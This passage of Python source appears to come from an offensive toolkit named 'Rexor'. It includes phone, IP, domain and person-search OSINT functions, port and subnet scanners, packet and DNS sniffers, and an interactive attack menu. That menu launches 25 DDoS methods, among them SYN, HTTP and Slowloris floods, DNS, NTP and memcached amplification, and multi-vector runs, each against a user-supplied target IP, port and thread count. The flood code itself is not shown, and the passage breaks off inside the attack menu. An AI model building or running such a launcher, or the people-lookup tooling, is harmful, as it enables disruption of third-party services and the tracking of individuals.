        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ PHONE OSINT: {phone:<22}║[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]\n")
        cleaned = re.sub(r'[\s\-\(\)\+\.]', '', phone)
        ce.print(f"[bold red][+] Cleaned number: {cleaned}[/bold red]")
        ce.print(f"[bold red][+] Number of digits: {len(cleaned)}[/bold red]")
        if len(cleaned) >= 10:
            cc = cleaned[:-10] if len(cleaned) > 10 else '1'
            local = cleaned[-10:]
            ce.print(f"[bold red][+] Probable country code: +{cc}[/bold red]")
            ce.print(f"[bold red][+] Local number: {local}[/bold red]")
            # format it a few ways
            ce.print(f"\n[bold red][*] Possible formats:[/bold red]")
            ce.print(f"[bold red]    International: +{cc} {local[:3]} {local[3:6]} {local[6:]}[/bold red]")
            ce.print(f"[bold red]    National: ({local[:3]}) {local[3:6]}-{local[6:]}[/bold red]")
            ce.print(f"[bold red]    E.164: +{cc}{local}[/bold red]")
        # carrier info by prefix
        ce.print(f"\n[bold red][*] Looking up possible carriers by prefix...[/bold red]")
        carrier_db = {
            "US/Canada": {
                "prefixes": ["201","202","203","205","206","207","208","209","210","212","213","214","215","216","217","218","219","224","225","228","229","231","234","239","240","248","251","252","253","254","256","260","262","267","269","270","272","274","276","279","281","283","301","302","303","304","305","307","308","309","310","312","313","314","315","316","317","318","319","320","321","323","325","326","330","331","332","334","336","337","339","340","341","346","347","351","352","360","361","364","380","385","386","401","402","404","405","406","407","408","409","410","412","413","414","415","417","419","423","424","425","430","432","434","435","440","442","443","447","448","450","456","458","463","469","470","475","478","479","480","484","501","502","503","504","505","507","508","509","510","512","513","515","516","517","518","520","530","531","534","539","540","541","551","559","561","562","563","564","567","570","571","573","574","575","580","585","586","601","602","603","605","606","607","608","609","610","612","614","615","616","617","618","619","620","623","626","628","629","630","631","636","640","641","646","650","651","657","660","661","662","667","669","678","679","680","681","682","689","701","702","703","704","706","707","708","712","713","714","715","716","717","718","719","720","724","725","727","731","732","734","737","740","743","747","754","757","760","762","763","764","765","769","770","772","773","774","775","779","781","785","786","801","802","803","804","805","806","808","810","812","813","814","815","816","817","818","820","828","830","831","832","835","843","845","847","848","850","854","856","857","858","859","860","862","863","864","865","870","872","878","901","903","904","906","907","908","909","910","912","913","914","915","916","917","918","919","920","925","928","929","930","931","934","936","937","938","940","941","945","947","949","951","952","954","956","959","970","971","972","973","978","979","980","984","985","989"],
                "carriers": ["Verizon","AT&T","T-Mobile","Sprint","US Cellular","Metro","Boost","Cricket","Mint"]
            },
            "UK": {
                "prefixes": ["07","447","4407"],
                "carriers": ["EE","Vodafone","O2","Three","Virgin","BT","Sky"]
            },
            "India": {
                "prefixes": ["6","7","8","9","916","917","918","919"],
                "carriers": ["Jio","Airtel","Vi","BSNL","MTNL"]
            },
            "Australia": {
                "prefixes": ["04","614","6104"],
                "carriers": ["Telstra","Optus","Vodafone","TPG","Boost"]
            },
            "Germany": {
                "prefixes": ["015","016","017","4915","4916","4917"],
                "carriers": ["Telekom","Vodafone","O2","1&1"]
            }
        }
        found_carrier = False
        for region, data in carrier_db.items():
            for prefix in data["prefixes"]:
                if cleaned.startswith(prefix) or (len(cleaned) >= 10 and cleaned[-10:].startswith(prefix)):
                    ce.print(f"[bold red]    Region: {region}[/bold red]")
                    ce.print(f"[bold red]    Possible carriers: {', '.join(data['carriers'])}[/bold red]")
                    found_carrier = True
                    break
            if found_carrier: break
        if not found_carrier:
            ce.print("[bold red]    └─ Could not determine carrier from prefix[/bold red]")
        # search social media too
        ce.print(f"\n[bold red][*] Searching social media with phone number...[/bold red]")
        self.username_search(cleaned)

    def ip_geolocation(self, ip):
        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ IP GEOLOCATION: {ip:<19}║[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]\n")
        # try ip-api first, its usually pretty good
        try:
            resp = self.session.get(
                f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    table = Table(title="[bold red]IP GEOLOCATION RESULTS[/bold red]", border_style="red", box=box.HEAVY, show_lines=True)
                    table.add_column("[bold red]FIELD[/bold red]", style="red", no_wrap=True)
                    table.add_column("[bold red]VALUE[/bold red]", style="red")
                    fields = [
                        ('Country', 'country'), ('Country Code', 'countryCode'),
                        ('Region', 'regionName'), ('City', 'city'), ('ZIP/Postal', 'zip'),
                        ('Latitude', 'lat'), ('Longitude', 'lon'), ('Timezone', 'timezone'),
                        ('ISP', 'isp'), ('Organization', 'org'), ('AS Number', 'as'),
                        ('AS Name', 'asname'), ('Reverse DNS', 'reverse'),
                        ('Mobile Network', 'mobile'), ('Proxy/VPN', 'proxy'),
                        ('Hosting/DC', 'hosting'), ('IP', 'query')
                    ]
                    for label, key in fields:
                        val = data.get(key, 'N/A')
                        if val == '' or val is None: val = 'N/A'
                        table.add_row(f"[red]{label}[/red]", f"[bold red]{val}[/bold red]")
                    ce.print(table)
                    lat, lon = data.get('lat'), data.get('lon')
                    if lat and lon:
                        ce.print(f"\n[bold red][+] Google Maps: https://www.google.com/maps?q={lat},{lon}[/bold red]")
                        ce.print(f"[bold red][+] OpenStreetMap: https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=12[/bold red]")
                        ce.print(f"[bold red][+] Apple Maps: https://maps.apple.com/?q={lat},{lon}[/bold red]")
                    return
                else:
                    ce.print(f"[bold red][!] API error: {data.get('message','Unknown')}[/bold red]")
        except Exception as e:
            ce.print(f"[bold red][!] ip-api.com lookup failed: {e}[/bold red]")
        # fallback to ipapi.co
        ce.print(f"\n[bold red][*] Trying fallback API...[/bold red]")
        try:
            resp = self.session.get(f"https://ipapi.co/{ip}/json/", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if not data.get('error'):
                    ce.print(f"[bold red]    Country: {data.get('country_name','N/A')}[/bold red]")
                    ce.print(f"[bold red]    Region: {data.get('region','N/A')}[/bold red]")
                    ce.print(f"[bold red]    City: {data.get('city','N/A')}[/bold red]")
                    ce.print(f"[bold red]    ISP: {data.get('org','N/A')}[/bold red]")
        except: pass

    def domain_osint(self, domain):
        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ DOMAIN OSINT: {domain:<21}║[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]\n")
        domain = domain.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
        ce.print(f"[bold red][+] Target domain: {domain}[/bold red]")
        # resolve the domain first
        try:
            ip = socket.gethostbyname(domain)
            ce.print(f"[bold red][+] Resolved IP: {ip}[/bold red]")
        except:
            ce.print("[bold red][!] Could not resolve domain[/bold red]")
            ip = None
        # whois
        ce.print(f"\n[bold red][*] WHOIS Information:[/bold red]")
        try:
            import whois
            w = whois.whois(domain)
            if w and w.domain_name:
                table = Table(title="[bold red]WHOIS RECORD[/bold red]", border_style="red", box=box.HEAVY, show_lines=True)
                table.add_column("[bold red]FIELD[/bold red]", style="red", no_wrap=True)
                table.add_column("[bold red]VALUE[/bold red]", style="red")
                whois_fields = [
                    ('Registrar', 'registrar'),
                    ('Creation Date', 'creation_date'),
                    ('Expiration Date', 'expiration_date'),
                    ('Updated Date', 'updated_date'),
                    ('Organization', 'org'),
                    ('Country', 'country'),
                    ('State', 'state'),
                    ('City', 'city'),
                    ('Emails', 'emails'),
                    ('Name Servers', 'name_servers'),
                ]
                for label, key in whois_fields:
                    val = w.get(key, 'N/A')
                    if isinstance(val, list):
                        val = ', '.join(str(v) for v in val[:5] if v)
                    elif isinstance(val, datetime):
                        val = val.strftime('%Y-%m-%d %H:%M:%S')
                    if not val or val == '': val = 'N/A'
                    table.add_row(f"[red]{label}[/red]", f"[red]{str(val)[:120]}[/red]")
                ce.print(table)
            else:
                ce.print("[bold red]    └─ No WHOIS data found (might be privacy protected)[/bold red]")
        except Exception as e:
            ce.print(f"[bold red]    └─ WHOIS lookup failed: {e}[/bold red]")
        # dns records
        ce.print(f"\n[bold red][*] DNS Records:[/bold red]")
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'SRV', 'CAA', 'PTR']
        try:
            import dns.resolver
            for rt in record_types:
                try:
                    answers = dns.resolver.resolve(domain, rt)
                    records = list(answers)[:5]
                    if records:
                        ce.print(f"[bold red]    ── {rt} Records:[/bold red]")
                        for rdata in records:
                            ce.print(f"[bold red]        └─ {str(rdata)[:120]}[/bold red]")
                except dns.resolver.NoAnswer:
                    pass
                except dns.resolver.NXDOMAIN:
                    ce.print(f"[bold red]    └─ Domain {domain} does not exist[/bold red]")
                    break
                except Exception:
                    pass
        except ImportError:
            ce.print("[bold red]    └─ dnspython not installed (pip install dnspython)[/bold red]")
        except Exception:
            ce.print("[bold red]    └─ DNS resolution failed[/bold red]")
        # subdomain enumeration
        ce.print(f"\n[bold red][*] Subdomain enumeration ({len(SUBDOMAIN_WORDLIST)} words):[/bold red]")
        found_subs = []
        with Progress(
            SpinnerColumn(), TextColumn("[bold red]{task.description}[/bold red]"),
            BarColumn(bar_width=30, style="red"), TextColumn("[bold red]{task.completed}/{task.total}[/bold red]"),
            console=ce,
        ) as progress:
            task = progress.add_task("[red]Checking subdomains...[/red]", total=len(SUBDOMAIN_WORDLIST))
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {}
                for sub in SUBDOMAIN_WORDLIST:
                    host = f"{sub}.{domain}"
                    futures[executor.submit(self._resolve, host)] = sub
                for future in as_completed(futures):
                    sub = futures[future]
                    try:
                        if future.result():
                            found_subs.append(sub)
                            ce.print(f"[bold green]    ✓ {sub}.{domain}[/bold green]")
                    except: pass
                    progress.update(task, advance=1)
        if found_subs:
            ce.print(f"\n[bold red][+] Found {len(found_subs)} active subdomains[/bold red]")
        else:
            ce.print(f"\n[bold red][!] No subdomains found[/bold red]")
        # certificate transparency
        ce.print(f"\n[bold red][*] Certificate transparency log (crt.sh):[/bold red]")
        try:
            resp = self.session.get(
                f"https://crt.sh/?q=%25.{domain}&output=json", timeout=20
            )
            if resp.status_code == 200:
                subs = set()
                for entry in resp.json()[:100]:
                    name = entry.get('name_value', '')
                    for n in name.split('\n'):
                        n = n.strip().lower().replace('*.', '')
                        if n and domain in n and n != domain:
                            subs.add(n)
                if subs:
                    for s in sorted(list(subs))[:25]:
                        ce.print(f"[bold green]    ✓ {s}[/bold green]")
                    ce.print(f"[bold red]    ... and {max(0,len(subs)-25)} more[/bold red]")
                else:
                    ce.print("[bold red]    └─ No subdomains found in CT logs[/bold red]")
        except Exception:
            ce.print("[bold red]    └─ CT log lookup failed[/bold red]")
        # also do ip geolocation if we got an ip
        if ip:
            ce.print(f"\n[bold red][*] Running IP geolocation on {ip}...[/bold red]")
            self.ip_geolocation(ip)

    def _resolve(self, host):
        try:
            socket.gethostbyname(host)
            return True
        except: return False

    def port_scanner(self, ip, ports=None):
        if ports is None: ports = list(COMMON_PORTS.keys())
        ce.print(f"\n[bold red][*] Scanning {ip} - {len(ports)} ports[/bold red]")
        open_ports = []
        with Progress(SpinnerColumn(), TextColumn("[bold red]Scanning...[/bold red]"), BarColumn(bar_width=30, style="red"), TextColumn("[bold red]{task.completed}/{task.total}[/bold red]"), console=ce) as progress:
            task = progress.add_task("[red]Ports[/red]", total=len(ports))
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self._scan_port, ip, p): p for p in ports}
                for f in as_completed(futures):
                    p = futures[f]
                    try:
                        if f.result():
                            svc = COMMON_PORTS.get(p, "Unknown")
                            open_ports.append((p, svc))
                            ce.print(f"[bold green]    {p}/tcp ─ {svc} ─ OPEN[/bold green]")
                    except: pass
                    progress.update(task, advance=1)
        ce.print(f"\n[bold red][+] {len(open_ports)} open ports found[/bold red]")
        if open_ports:
            ce.print(f"[bold red][*] Quick analysis:[/bold red]")
            for port, svc in sorted(open_ports):
                if port in [22,3389,5900]: ce.print(f"[bold red]    └─ {port} ({svc}) - Remote access service, check for weak credentials[/bold red]")
                elif port in [80,443,8080,8443]: ce.print(f"[bold red]    └─ {port} ({svc}) - Web server, check for web vulnerabilities[/bold red]")
                elif port in [21]: ce.print(f"[bold red]    └─ {port} ({svc}) - FTP server, check for anonymous login[/bold red]")
                elif port in [3306,5432,27017,6379]: ce.print(f"[bold red]    └─ {port} ({svc}) - Database, ensure not exposed to internet[/bold red]")
                else: ce.print(f"[bold red]    └─ {port} ({svc})[/bold red]")

    def _scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            r = s.connect_ex((ip, port))
            s.close()
            return r == 0
        except: return False

    def social_media_deep(self, username):
        ce.print(f"\n[bold red][*] Deep social media search for: {username}[/bold red]")
        extra_platforms = {
            "periscope": f"https://www.pscp.tv/{username}", "dlive": f"https://dlive.tv/{username}",
            "odysee": f"https://odysee.com/@{username}", "bitchute": f"https://www.bitchute.com/channel/{username}",
            "rumble": f"https://rumble.com/user/{username}", "minds": f"https://www.minds.com/{username}",
            "parler": f"https://parler.com/profile/{username}", "gab": f"https://gab.com/{username}",
            "mewe": f"https://mewe.com/i/{username}", "signal": f"https://signal.org/",
            "discord": f"https://discord.com/users/{username}", "threads": f"https://www.threads.net/@{username}",
            "truthsocial": f"https://truthsocial.com/@username", "gettr": f"https://gettr.com/user/{username}",
        }
        found_count = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for p, url in extra_platforms.items():
                futures[executor.submit(self._check_profile, p, url)] = p
            for f in as_completed(futures):
                p = futures[f]
                try:
                    result = f.result()
                    if result:
                        _, exists, url = result
                        if exists:
                            found_count += 1
                            ce.print(f"[bold green]    ✓ {p}: {url}[/bold green]")
                except: pass
        ce.print(f"\n[bold red][+] Found on {found_count} additional platforms[/bold red]")

    def email_to_social(self, email):
        ce.print(f"\n[bold red][*] Extracting username from email: {email}[/bold red]")
        username = email.split("@")[0]
        ce.print(f"[bold red][+] Username: {username}[/bold red]")
        self.username_search(username)

    def reverse_image_search_prep(self, image_url):
        ce.print(f"\n[bold red][*] Reverse image search links:[/bold red]")
        encoded = __import__('urllib.parse').quote(image_url, safe='')
        ce.print(f"[bold red]    Google Lens: https://lens.google.com/uploadbyurl?url={encoded}[/bold red]")
        ce.print(f"[bold red]    Yandex: https://yandex.com/images/search?rpt=imageview&url={encoded}[/bold red]")
        ce.print(f"[bold red]    TinEye: https://tineye.com/search?url={encoded}[/bold red]")
        ce.print(f"[bold red]    Bing: https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{encoded}[/bold red]")
        ce.print(f"[bold red]    Baidu: https://image.baidu.com/pcdutu?queryImageUrl={encoded}[/bold red]")

    def darknet_search(self, query):
        ce.print(f"\n[bold red][*] Darknet search engines (surface proxies):[/bold red]")
        ce.print(f"[bold red]    Ahmia: https://ahmia.fi/search/?q={query}[/bold red]")
        ce.print(f"[bold red]    DarkSearch: https://darksearch.io/search?query={query}[/bold red]")
        ce.print(f"[bold red]    OnionLand: https://onionlandsearchengine.com/search?q={query}[/bold red]")

    def crypto_address_check(self, address):
        ce.print(f"\n[bold red][*] Crypto address lookup: {address[:20]}...[/bold red]")
        if address.lower().startswith("1") or address.lower().startswith("3") or address.lower().startswith("bc1"):
            ce.print(f"[bold red]    Type: Bitcoin[/bold red]")
            ce.print(f"[bold red]    Explorer: https://www.blockchain.com/explorer/addresses/btc/{address}[/bold red]")
            ce.print(f"[bold red]    Blockchair: https://blockchair.com/bitcoin/address/{address}[/bold red]")
            ce.print(f"[bold red]    OXT: https://oxt.me/address/{address}[/bold red]")
        elif address.lower().startswith("0x"):
            ce.print(f"[bold red]    Type: Ethereum/EVM[/bold red]")
            ce.print(f"[bold red]    Etherscan: https://etherscan.io/address/{address}[/bold red]")
            ce.print(f"[bold red]    Blockchair: https://blockchair.com/ethereum/address/{address}[/bold red]")
            ce.print(f"[bold red]    Debank: https://debank.com/profile/{address}[/bold red]")
        elif address.lower().startswith("xpub") or address.lower().startswith("ypub") or address.lower().startswith("zpub"):
            ce.print(f"[bold red]    Type: Bitcoin Extended Public Key[/bold red]")
            ce.print(f"[bold red]    Blockchair: https://blockchair.com/bitcoin/xpub/{address}[/bold red]")
        else:
            ce.print(f"[bold red]    Type: Unknown - try Blockchair: https://blockchair.com/search?q={address}[/bold red]")

    def vehicle_lookup(self, vin_or_plate):
        ce.print(f"\n[bold red][*] Vehicle lookup resources:[/bold red]")
        ce.print(f"[bold red]    NHTSA VIN Decoder: https://vpic.nhtsa.dot.gov/decoder/[/bold red]")
        ce.print(f"[bold red]    VehicleHistory: https://www.vehiclehistory.gov/[/bold red]")
        ce.print(f"[bold red]    NICB VINCheck: https://www.nicb.org/vincheck[/bold red]")
        ce.print(f"[bold red]    AutoCheck: https://www.autocheck.com/[/bold red]")

    def person_search(self, name, location=""):
        ce.print(f"\n[bold red][*] Person search: {name} {location}[/bold red]")
        name_enc = urllib.parse.quote(name)
        ce.print(f"[bold red]    Whitepages: https://www.whitepages.com/name/{name_enc}[/bold red]")
        ce.print(f"[bold red]    TruePeopleSearch: https://www.truepeoplesearch.com/results?name={name_enc}[/bold red]")
        ce.print(f"[bold red]    FastPeopleSearch: https://www.fastpeoplesearch.com/name/{name_enc}[/bold red]")
        ce.print(f"[bold red]    That's Them: https://thatsthem.com/name/{name_enc}[/bold red]")
        ce.print(f"[bold red]    US Search: https://www.ussearch.com/consumer/name/{name_enc}[/bold red]")

    def company_osint(self, company):
        ce.print(f"\n[bold red][*] Company OSINT: {company}[/bold red]")
        ce.print(f"[bold red]    LinkedIn: https://www.linkedin.com/company/{company}[/bold red]")
        ce.print(f"[bold red]    Crunchbase: https://www.crunchbase.com/organization/{company}[/bold red]")
        ce.print(f"[bold red]    Glassdoor: https://www.glassdoor.com/Search/results.htm?keyword={company}[/bold red]")
        ce.print(f"[bold red]    SEC EDGAR: https://www.sec.gov/cgi-bin/browse-edgar?company={company}[/bold red]")
        ce.print(f"[bold red]    OpenCorporates: https://opencorporates.com/companies?q={company}[/bold red]")
        ce.print(f"[bold red]    WikiData: https://www.wikidata.org/w/index.php?search={company}[/bold red]")


class RexorSniffer:
    """network sniffing and scanning utilities"""

    def scan_wifi(self):
        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ WIFI SCANNER[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]\n")
        try:
            if sys.platform == "linux":
                r = subprocess.run(
                    "nmcli -t -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list",
                    shell=True, capture_output=True, text=True, timeout=30
                )
                nets = []
                for line in r.stdout.strip().split("\n"):
                    p = line.split(":")
                    if len(p) >= 5:
                        nets.append({"ssid": p[0] or "[HIDDEN]", "bssid": p[1], "ch": p[2], "sig": p[3], "sec": p[4]})
                if not nets:
                    ce.print("[bold red][!] No networks found or WiFi is off[/bold red]")
                    return
                table = Table(title="[bold red]WIFI NETWORKS[/bold red]", border_style="red", box=box.HEAVY)
                for c in ["SSID", "BSSID", "CH", "SIGNAL", "SECURITY"]:
                    table.add_column(f"[bold red]{c}[/bold red]", style="red")
                for n in sorted(nets, key=lambda x: x["sig"], reverse=True):
                    sig_int = int(n['sig']) if n['sig'].isdigit() else 0
                    bar = '█' * min(sig_int // 10, 10)
                    table.add_row(
                        f"[red]{n['ssid'][:30]}[/red]", f"[red]{n['bssid']}[/red]",
                        f"[red]{n['ch']}[/red]", f"[red]{bar} {n['sig']}%[/red]",
                        f"[red]{n['sec']}[/red]"
                    )
                ce.print(table)
                ce.print(f"\n[bold red][+] {len(nets)} networks found[/bold red]")
            elif sys.platform == "darwin":
                r = subprocess.run(
                    "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s",
                    shell=True, capture_output=True, text=True, timeout=30
                )
                ce.print(f"[bold red]{r.stdout}[/bold red]")
            elif sys.platform == "win32":
                r = subprocess.run("netsh wlan show networks mode=Bssid", shell=True, capture_output=True, text=True, timeout=30)
                ce.print(f"[bold red]{r.stdout}[/bold red]")
        except Exception as e:
            ce.print(f"[bold red][!] Error: {e}[/bold red]")

    def packet_sniffer(self, interface=None, count=100):
        ce.print(f"\n[bold red][*] Packet sniffer - requires root/admin and scapy[/bold red]")
        try:
            import scapy.all as scapy
            ce.print(f"[bold red][*] Capturing {count} packets on {interface or 'default interface'}...[/bold red]")
            ce.print(f"[bold red][*] Press Ctrl+C to stop early[/bold red]\n")
            packets = scapy.sniff(iface=interface, count=count, timeout=60)
            ce.print(f"\n[bold red][+] Captured {len(packets)} packets[/bold red]")
            # show a quick summary
            ip_count = {}
            for pkt in packets:
                if pkt.haslayer(scapy.IP):
                    src = pkt[scapy.IP].src
                    dst = pkt[scapy.IP].dst
                    ip_count[src] = ip_count.get(src, 0) + 1
                    ip_count[dst] = ip_count.get(dst, 0) + 1
            # top talkers
            top = sorted(ip_count.items(), key=lambda x: x[1], reverse=True)[:10]
            if top:
                ce.print(f"\n[bold red][*] Top talkers:[/bold red]")
                for ip, cnt in top:
                    ce.print(f"[bold red]    {ip} - {cnt} packets[/bold red]")
        except ImportError:
            ce.print("[bold red][!] scapy not installed - run: pip install scapy[/bold red]")
        except PermissionError:
            ce.print("[bold red][!] Need root/admin privileges for packet capture[/bold red]")

    def network_scanner(self, subnet):
        ce.print(f"\n[bold red][*] Scanning subnet {subnet}...[/bold red]")
        try:
            import scapy.all as scapy
            ce.print(f"[bold red][*] Sending ARP requests...[/bold red]")
            ans, unans = scapy.arping(subnet, timeout=3, verbose=False)
            if ans:
                table = Table(title="[bold red]DISCOVERED HOSTS[/bold red]", border_style="red", box=box.HEAVY)
                table.add_column("[bold red]IP ADDRESS[/bold red]", style="red")
                table.add_column("[bold red]MAC ADDRESS[/bold red]", style="red")
                table.add_column("[bold red]HOSTNAME[/bold red]", style="red")
                for sent, recv in ans:
                    ip = recv.psrc
                    mac = recv.hwsrc
                    try: hostname = socket.gethostbyaddr(ip)[0]
                    except: hostname = "Unknown"
                    table.add_row(f"[red]{ip}[/red]", f"[red]{mac}[/red]", f"[red]{hostname}[/red]")
                ce.print(table)
                ce.print(f"\n[bold red][+] {len(ans)} hosts found[/bold red]")
            else:
                ce.print("[bold red][!] No hosts responded[/bold red]")
        except ImportError:
            ce.print("[bold red][!] scapy not installed - run: pip install scapy[/bold red]")
        except PermissionError:
            ce.print("[bold red][!] Need root/admin privileges[/bold red]")

    def arp_spoof_detect(self):
        ce.print(f"\n[bold red][*] ARP spoof detector - requires scapy + root[/bold red]")
        try:
            import scapy.all as scapy
            ce.print(f"[bold red][*] Listening for ARP anomalies (30 seconds)...[/bold red]")
            ce.print(f"[bold red][*] Press Ctrl+C to stop[/bold red]\n")
            known = {}
            alerts = 0
            def detect(pkt):
                nonlocal alerts
                if pkt.haslayer(scapy.ARP) and pkt[scapy.ARP].op == 2:
                    ip = pkt[scapy.ARP].psrc
                    mac = pkt[scapy.ARP].hwsrc
                    if ip in known and known[ip] != mac:
                        ce.print(f"[bold red][!] ALERT: ARP spoofing detected! {ip} was {known[ip]} now claims {mac}[/bold red]")
                        alerts += 1
                    known[ip] = mac
            scapy.sniff(prn=detect, filter="arp", timeout=30, store=False)
            if alerts == 0:
                ce.print(f"[bold green][+] No ARP spoofing detected[/bold green]")
            else:
                ce.print(f"[bold red][!] {alerts} ARP spoofing alerts[/bold red]")
        except ImportError:
            ce.print("[bold red][!] Need scapy: pip install scapy[/bold red]")
        except PermissionError:
            ce.print("[bold red][!] Need root/admin[/bold red]")

    def dns_sniffer(self):
        ce.print(f"\n[bold red][*] DNS sniffer - requires scapy + root[/bold red]")
        try:
            import scapy.all as scapy
            ce.print(f"[bold red][*] Capturing DNS queries (30 seconds)...[/bold red]")
            ce.print(f"[bold red][*] Press Ctrl+C to stop[/bold red]\n")
            queries = set()
            def dns_cb(pkt):
                if pkt.haslayer(scapy.DNSQR):
                    qname = pkt[scapy.DNSQR].qname.decode()
                    if qname not in queries:
                        queries.add(qname)
                        ce.print(f"[red]DNS: {qname:<50} from {pkt[scapy.IP].src}[/red]")
            scapy.sniff(prn=dns_cb, filter="udp port 53", timeout=30, store=False)
            ce.print(f"\n[bold red][+] {len(queries)} unique DNS queries captured[/bold red]")
        except ImportError:
            ce.print("[bold red][!] Need scapy: pip install scapy[/bold red]")
        except PermissionError:
            ce.print("[bold red][!] Need root/admin[/bold red]")


class Rexor:
    """main application class that ties everything together"""

    def __init__(self):
        self.floods = RexorFloods()
        self.osint = RexorOSINT()
        self.sniffer = RexorSniffer()
        self.command_history = []

    def clear_screen(self):
        os.system("clear" if os.name != "nt" else "cls")

    def show_banner(self):
        self.clear_screen()
        ce.print(BANNER)
        ce.print(f"[bold red]    ═══════════════════════════════════════════════[/bold red]")
        ce.print(f"[bold red]    RE: X O R  •  OSINT | NETWORK | TOOLKIT[/bold red]")
        ce.print(f"[bold red]    Version {VERSION}[/bold red]")
        ce.print(f"[bold red]    ═══════════════════════════════════════════════[/bold red]\n")

    def run(self):
        while True:
            self.show_banner()
            ce.print("""[bold red]
Rexor {
    "1": "Attacks (24 Methods)",
    "2": "OSINT (20 Options)",
    "3": "Sniffer (5 Options)",
    "4": "Network Scanner",
    "5": "WiFi Scanner",
    "help": "Show Commands",
    "clear": "Clear Screen",
    "0": "Exit"
}
[/bold red]""")
            try:
                user = input(Fore.RED + "REXOR > " + Style.RESET_ALL).strip().lower()
            except (EOFError, KeyboardInterrupt):
                ce.print("\n[bold red][!] Exiting...[/bold red]")
                break
            self.command_history.append(user)
            if user == "1": self.attacks_menu()
            elif user == "2": self.osint_menu()
            elif user == "3": self.sniffer_menu()
            elif user == "4":
                subnet = input(Fore.RED + "Subnet (e.g. 192.168.1.0/24): " + Style.RESET_ALL).strip()
                if subnet: self.sniffer.network_scanner(subnet)
                else: ce.print("[bold red][!] Please enter a subnet[/bold red]")
                input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)
            elif user == "5":
                self.sniffer.scan_wifi()
                input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)
            elif user == "help":
                ce.print("""[bold red]
Commands:
  1  - Attack menu (TCP, UDP, HTTP floods etc)
  2  - OSINT menu (username search, email, phone, domain etc)
  3  - Sniffer menu (packet capture, wifi scan etc)
  4  - Quick network scanner
  5  - Quick wifi scanner
  help - Show this help
  clear - Clear the screen
  0  - Exit program
[/bold red]""")
                input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)
            elif user == "0" or user == "exit" or user == "quit":
                ce.print("[bold red][!] Exiting Rexor...[/bold red]")
                break
            else:
                ce.print("[bold red][!] Unknown command. Type 'help' for options.[/bold red]")
                time.sleep(1)

    def attacks_menu(self):
        self.show_banner()
        ce.print("""[bold red]
Rexor {
    "Attacks": {
        "1": "TCP Flood",        "2": "UDP Flood",        "3": "SYN Flood",
        "4": "ACK Flood",        "5": "FIN Flood",        "6": "RST Flood",
        "7": "XMAS Flood",       "8": "HTTP Flood",       "9": "HTTPS Flood",
        "10": "Slow Read",       "11": "ICMP Flood",      "12": "Slowloris",
        "13": "R.U.D.Y",         "14": "DNS Amp",         "15": "NTP Amp",
        "16": "Memcached Amp",   "17": "SSDP Amp",        "18": "Chargen Flood",
        "19": "Smurf Attack",    "20": "LAND Attack",     "21": "Teardrop",
        "22": "Ping of Death",   "23": "Conn Exhaust",    "24": "Bandwidth Flood",
        "25": "Multi-Vector"
    },
    "0": "Back"
}
[/bold red]""")
        user = input(Fore.RED + "ATTACK > " + Style.RESET_ALL).strip()
        if user == "0": return
        if user == "25":
            ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
            port = int(input(Fore.RED + "Port: " + Style.RESET_ALL).strip() or "80")
            vectors_input = input(Fore.RED + "Vectors (comma separated): " + Style.RESET_ALL).strip()
            vectors = [v.strip().lower() for v in vectors_input.split(",") if v.strip()]
            valid_vectors = {"tcp","udp","http","syn","loris","rudy","icmp","ack","fin","rst","xmas","slowread","https","connexhaust","bandwidth"}
            for v in vectors:
                if v in valid_vectors:
                    threading.Thread(target=self.floods.ddos, args=(v, ip, port, 25, 10), daemon=True).start()
                    ce.print(f"[bold red][+] Started {v.upper()} vector[/bold red]")
            ce.print(f"[bold red][*] Running {len(vectors)} vectors. Press Ctrl+C to stop all.[/bold red]")
            try:
                while self.floods.running: time.sleep(1)
            except KeyboardInterrupt:
                self.floods.stop()
                ce.print("\n[bold red][!] All vectors stopped[/bold red]")
            input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            return
        methods = {
            "1":"tcp","2":"udp","3":"syn","4":"ack","5":"fin","6":"rst","7":"xmas",
            "8":"http","9":"https","10":"slowread","11":"icmp","12":"loris","13":"rudy",
            "14":"dnsamp","15":"ntpamp","16":"memamp","17":"ssdp","18":"chargen",
            "19":"smurf","20":"land","21":"teardrop","22":"pod","23":"connexhaust","24":"bandwidth"
        }
        if user not in methods: return
        method = methods[user]
        ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
        port = int(input(Fore.RED + "Port: " + Style.RESET_ALL).strip() or "80")
        threads = int(input(Fore.RED + "Threads: " + Style.RESET_ALL).strip() or "100")
        sockets = int(input(Fore.RED + "Sockets: " + Style.RESET_ALL).strip() or "50")
        size = int(input(Fore.RED + "Packet Size: " + Style.RESET_ALL).strip() or "1024")
        extra = ""
        if method in ["dnsamp","ntpamp","memamp","smurf"]:
